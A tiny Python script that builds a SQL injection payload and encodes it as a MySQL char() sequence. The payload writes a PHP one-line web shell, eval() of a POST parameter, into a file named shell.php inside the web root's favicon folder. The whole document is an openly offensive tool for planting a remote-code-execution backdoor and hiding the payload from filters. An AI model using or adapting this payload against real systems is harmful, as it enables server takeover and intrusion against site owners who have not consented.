str = "select '<?php eval($_POST[_]);?>' into outfile '/var/www/html/favicon/shell.php';"
len_str = len(str)
for i in range(0, len_str):
    if i == 0:
        print('char(%s' % ord(str[i]), end='')
    else:
        print(',%s' % ord(str[i]), end="")
print(')')
